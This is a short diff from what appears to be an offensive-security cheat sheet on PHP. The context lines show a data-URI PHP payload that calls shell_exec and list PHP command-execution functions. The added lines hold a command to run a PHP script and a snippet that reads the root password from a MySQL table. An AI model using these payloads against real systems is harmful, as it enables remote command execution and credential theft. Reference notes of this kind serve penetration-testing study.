@@ -2893,6 +2893,19 @@ data:text/plain,<?php echo shell_exec("command_here") ?>
 system()
 shell_exec()
 passthru()
+
+# run php script
+php -f /path/to/script.php
+
+# connect to mysql db
+<?php
+mysql_connect("IP_here", "mysql_username_here", "password_here") or die(mysql_error());
+mysql_select_db('db_name_here');
+$res = mysql_query('select password from passwd where user_name="root"'); # mysql query here
+$str = mysql_fetch_array($res);
+$bla = $str['password']; # read out value from results array
+print $bla;
+?>
 ```
 
 
